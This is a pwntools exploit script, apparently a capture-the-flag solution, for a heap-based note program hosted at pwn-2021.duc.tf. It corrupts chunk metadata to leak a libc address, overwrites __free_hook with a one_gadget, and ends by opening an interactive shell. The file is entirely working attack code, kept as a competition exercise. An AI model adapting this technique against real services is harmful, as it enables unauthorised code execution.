import struct
from pwn import *

def create_note(size):
        target.recvuntil(">> ")
        target.sendline("1")
        target.recvuntil("Size: ")
        target.sendline(size)

def edit_note(contents):
        target.recvuntil(">> ")
        target.sendline("3")
        target.recvuntil("\n")
        target.send(contents)

def delete_note():
        target.recvuntil(">> ")
        target.sendline("4")

def show_note():
        target.recvuntil(">> ")
        target.sendline("2")
        s = target.recvuntil('1. ')
        idx = s.find(struct.pack('B', 0x7f))
        x = (s[idx + 3:idx+12]).hex()
        y = "".join(reversed([x[i:i+2] for i in range(0, len(x), 2)]))
        return y

target = remote("pwn-2021.duc.tf", "31917")

#INFOLEAK
create_note("127")
edit_note((struct.pack('I', 0x41414141) * 120) \
	+ (b"I" * 20) \
	+ struct.pack('Q', 0x101) + \
	(b"I" * 32) + b"\n")
delete_note()

# leaker
create_note("200")
edit_note((struct.pack('I', 0x41414141) * 120) \
	+ (b"I" * 20) \
	+ struct.pack('Q', 0x411) \
	+ (b"I" * 32) + b"\n")

delete_note()
# get back
create_note("200")
delete_note()
size = 0x891
# spacer
space = str(0x6d0)
create_note(space)
# metadata chunk
create_note("50")
edit_note(b"BBBB" + (struct.pack('Q', 0x11) * 32) + b"\n")
create_note("50")
edit_note(b"BBBB" + (struct.pack('Q', 0x11) * 32) + b"\n")
#regain old chunk

create_note("200")
edit_note(b"BBBB" \
	+ ((struct.pack('Q', 0x51) * 16)) \
	+ (b"Z" * 8) \
	+ ((struct.pack('Q', size) * 30)) \
	+ (b"I" * 20) \
	+ struct.pack('Q', size) \
	+ (b"I" * 32) + b"\n")

delete_note()
#leaker again
create_note("1023")
leak = show_note()
libc_base = (int("0x" + leak, 16) - 0x1ebbe0)

### RCE begin
delete_note()
create_note("228")
###########################################
free_hook = libc_base + 0x1eeb28
hook = (struct.pack('Q', free_hook - 16))
edit_note(b"BBBB" + (hook * int(128)) + b"\n")
input()
create_note("1010")
###########################################
one_gadget = struct.pack('Q', libc_base + 0xe6c81)
edit_note(b"BBBB" + (one_gadget * 20) + b"\n")
create_note("20")
delete_note()
target.interactive()
